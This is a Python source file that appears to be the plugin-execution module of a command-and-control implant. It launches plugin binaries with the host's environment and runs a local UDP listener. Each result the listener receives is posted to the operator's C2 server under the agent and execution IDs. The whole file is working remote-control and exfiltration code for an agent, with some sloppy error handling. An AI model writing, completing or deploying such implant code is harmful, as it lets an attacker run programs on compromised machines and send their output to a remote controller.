from threading import Thread 
import os
import subprocess
import socket

import sys
import comm.transport_Http as transportMode

class pluginExecution():
	executionId = None
	pluginObj = None
	dats =  None

	def __init__(self,pluginObj,executionId,args=""):
		self.executionId =executionId
		self.pluginObj = pluginObj
		self.args = args

	def execute(self):
		Thread(target=self.startAgentSocket).start()
		#replace with plugin location and args 
		print(f"hey, i just executed, plugin path is :{self.pluginObj.pluginpath_dir}")
		# Prep Environent variable to pass to plugin
		e = os.environ.copy()
		command = [self.pluginObj.pluginpath_dir, self.args]
		subprocess.Popen(command, env=e)

	
	def startAgentSocket(self):
		PORT = 6789
		agent_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		agent_s.bind(("localhost", PORT))
		#agent_s.settimeout(10)

		try:
		 while True:
		  self.data,addr = agent_s.recvfrom(2048)
		  jsonData = {
			"plugin":self.pluginObj.pluginId,
			"result":self.data.decode('utf-8')
			}
		  serverAddr =  self.pluginObj.c2url + "/results/"+ self.pluginObj.agent_id +"/"+ self.executionId
		  r = transportMode.sendRequest(serverAddr,jsonData,method="post")
		  if self.data == "END":
		  	agent_s.close()

		except:
			pass

		finally:
			#agent_s.close()
			print("Closed")
			print("received message: %s" % self.data)
		#	jsonData = {
		#	"plugin":self.pluginObj.pluginId,
		#	"result":self.data.decode('utf-8')}
		#	serverAddr =  self.pluginObj.c2url + "/results/"+ self.pluginObj.agent_id +"/"+ self.executionId
		#	r = transportMode.sendRequest(serverAddr,jsonData,method="post")




		  
	




